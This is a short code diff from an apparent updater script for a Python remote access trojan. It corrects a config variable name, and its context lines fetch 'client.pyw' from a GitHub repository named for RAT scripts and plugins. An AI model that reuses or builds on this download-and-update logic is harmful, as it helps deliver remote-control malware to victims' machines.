@@ -28,7 +28,7 @@ import requests
 
 localconfig = configparser.ConfigParser()
 localconfig.read('LOCALVERSION.ini')
-LOCALVERSION = config['LocalVersionInfo']['ClientVersion']
+LOCALVERSION = localconfig['LocalVersionInfo']['ClientVersion']
 VersionDataURL = ""
 FileDataURL = "https://raw.githubusercontent.com/finnaminope/Python-RAT-ScriptsAndPlugins/beta/client.pyw"
 r = requests.get(VersionDataURL) # create HTTP response object
